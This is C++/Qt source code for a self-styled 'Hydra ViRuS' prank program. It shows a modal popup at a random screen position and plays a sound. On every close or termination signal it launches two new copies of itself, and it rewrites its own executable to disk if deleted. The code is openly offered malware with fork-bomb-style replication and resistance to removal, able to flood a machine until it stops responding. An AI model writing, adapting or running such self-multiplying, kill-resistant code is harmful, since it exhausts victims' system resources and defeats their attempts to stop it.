// QT
#include <QtWidgets/QtWidgets>
#include <QtWidgets/QApplication>
#include <QtWidgets/QWidget>
#include <QtWidgets/QPushButton>
#include <QtWidgets/QBoxLayout>
#include <QtGui/QPixmap>
#include <QtGui/QScreen>
#include <QtCore/QProcess>
#include <QtCore/QFile>
#include <QtCore/QFileDevice>

// SFML
#include <SFML/Audio/Music.hpp>

// Standard
#include <ctime>
#include <iostream>

// Graphic and sound
#include "assets.h"

#ifdef __unix__
#include <unistd.h>
#include <signal.h>
#include <time.h>
#endif

#ifdef WIN32
#include <windows.h>
#endif

#define WIN_WIDTH 400
#define WIN_HEIGHT 100

long exe_length;
QFile exe_file;
QByteArray exe_data;
int perms;

// Since we may launch multiple times a second, we need something just a bit
// more random than std::time()
int os_get_random() {

#ifdef __unix__
  return getpid() + clock();
#endif

#ifdef WIN32
  return (GetTickCount64t()%99999) + std::time(NULL);
#endif

return std::time(NULL);

}

static void button_response() {
  QApplication::quit();
}

void spawn_two_more() {

  QString exe_name = exe_file.fileName();

  if (!exe_file.exists()) {
    QFile out_stream(exe_name);
    out_stream.open(QIODevice::WriteOnly);
    out_stream.write(exe_data);
    out_stream.setPermissions((QFileDevice::Permissions)perms);
    out_stream.close();
  }

  QProcess::startDetached(exe_name);
  QProcess::startDetached(exe_name);
}

void spawn_wrapper(int i) {
  spawn_two_more();
}

void trap_setup() {

#ifdef __unix__
  signal(SIGTERM, spawn_wrapper);
  signal(SIGINT, spawn_wrapper);
  signal(SIGQUIT, spawn_wrapper);
  signal(SIGKILL, spawn_wrapper);
  signal(SIGHUP, spawn_wrapper);
#endif

#ifdef WIN32
  //TODO
#endif
  return;

}

int main(int argc, char* argv[])  {

  trap_setup();

  // Read in the executable file, in case they try to delete it
  exe_file.setFileName(argv[0]);
  exe_file.open(QIODevice::ReadOnly);
  perms = exe_file.permissions();
  exe_data = exe_file.readAll();

  QApplication::setStyle(QStyleFactory::create("Windows"));
  QApplication app(argc, argv);

  QWidget window(NULL, Qt::Window);
  window.setWindowModality(Qt::ApplicationModal);
  window.setFixedSize(WIN_WIDTH, WIN_HEIGHT);

  // Setup and play Audio
  sf::Music music;
  music.openFromMemory(chord_ogg, CHORD_LENGTH);
  music.play();
  //QApplication::beep();

  // Setup layouts
  QBoxLayout layout(QBoxLayout::TopToBottom);
  QBoxLayout row1(QBoxLayout::LeftToRight);
  QBoxLayout row2(QBoxLayout::LeftToRight);
  layout.setSpacing(0);
  row1.setSpacing(0);
  row2.setSpacing(0);

  // Create hydra icon
  QLabel image(&window);
  image.setPixmap(QPixmap(hydra_xpm));
  image.move(10,10);

  // Create message text
  QLabel text("Cut off a head, two more will take its place.\n[ Hydra ViRuS ]");
  text.setAlignment(Qt::AlignHCenter |  Qt::AlignVCenter);

  // Create the button
  QPushButton button;
  button.setFixedSize(96, 26);
  button.setDefault(true);
  button.setText("OK");

  // Put the Window somewhere random on the desktop
  QRect screen = QApplication::desktop()->availableGeometry();
  std::srand(os_get_random());
  int spawn_x = std::rand()%(screen.width() - WIN_WIDTH);
  int spawn_y = std::rand()%(screen.height() - WIN_HEIGHT);
  window.setGeometry(spawn_x, spawn_y, WIN_WIDTH, WIN_HEIGHT);

  // Glue everything together
  row1.addWidget(&text, Qt::AlignLeft);
  row2.addWidget(&button, Qt::AlignHCenter);
  layout.addLayout(&row1);
  layout.addLayout(&row2);
  QObject::connect(&button, &QPushButton::clicked, button_response);

  // Start
  window.setLayout(&layout);
  window.show();
  app.exec();

  // Evil
  spawn_two_more();

  return 0;
}
